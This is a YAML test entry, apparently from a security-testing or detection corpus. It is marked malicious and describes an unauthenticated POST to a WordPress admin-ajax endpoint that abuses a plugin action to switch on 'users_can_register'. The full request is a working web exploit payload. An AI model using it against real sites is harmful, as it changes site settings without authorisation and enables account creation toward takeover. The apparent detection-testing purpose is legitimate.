- name: corp-option-flip
  malicious: true
  stage: escalate-privileges
  technique: T1190
  pattern: CAPEC-1
  expect: "users_can_register"
  correlation: marker
  request:
    method: POST
    path: /wp-admin/admin-ajax.php
    params:
      action: "wpgdprc_process_action"
      security: ""
    data:
      data: '{"type":"save_setting","append":false,"option":"users_can_register","value":"1"}'

